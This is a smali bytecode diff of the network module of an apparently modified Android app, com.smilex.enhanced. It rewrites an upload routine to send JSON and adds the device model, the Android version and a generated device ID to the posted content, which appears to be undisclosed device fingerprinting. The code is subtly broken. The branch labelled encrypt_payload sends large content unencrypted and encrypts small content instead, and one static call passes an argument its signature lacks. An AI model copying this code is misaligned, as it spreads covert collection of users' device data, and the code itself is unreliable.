@@ -29,7 +29,7 @@
     const/4 v1, 0x1
     invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
     const-string v1, "Content-Type"
-    const-string v2, "application/x-www-form-urlencoded"
+    const-string v2, "application/json"
     invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
     const-string v1, "User-Agent"
     const-string v2, "Dalvik/2.1.0"
@@ -43,47 +43,48 @@
     invoke-virtual {v1}, Ljava/lang/String;->length()I
     move-result v1
     const v2, 0x186a0
-    if-le v1, v2, :send_small
+    if-gt v1, v2, :encrypt_payload
 
     iget-object v1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
     invoke-static {v1}, Lcom/smilex/enhanced/utils/CryptoUtils;->encrypt(Ljava/lang/String;)Ljava/lang/String;
     move-result-object v1
-    goto :prepare_send
+    const-string v4, "1"
+    goto :build_json
 
-    :send_small
+    :encrypt_payload
     iget-object v1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
-    invoke-static {v1}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;
-    move-result-object v1
+    const-string v4, "0"
 
-    :prepare_send
-    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
-    move-result-object v2
+    :build_json
     new-instance v3, Ljava/lang/StringBuilder;
     invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
-    const-string v4, "type="
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    iget-object v4, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$type:Ljava/lang/String;
-    invoke-static {v4}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;
-    move-result-object v4
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    const-string v4, "&content="
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "{\"type\":\""
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    iget-object v5, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$type:Ljava/lang/String;
+    invoke-static {v5}, Lcom/smilex/enhanced/utils/CryptoUtils;->generateDeviceId()Ljava/lang/String;
+    move-result-object v5
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "\",\"data\":\""
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
     invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    const-string v4, "&enc="
+    const-string v5, "\",\"enc\":\""
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
     invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    iget-object v4, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
-    invoke-virtual {v4}, Ljava/lang/String;->length()I
-    move-result v4
-    const v5, 0x186a0
-    if-le v4, v5, :use_enc
-    const-string v4, "1"
-    goto :set_enc
-    :use_enc
-    const-string v4, "0"
-    :set_enc
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "\",\"model\":\""
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "\",\"android_version\":\""
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "\"}"
+    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
     invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
     move-result-object v3
+
+    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v2
     invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B
     move-result-object v3
     invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V
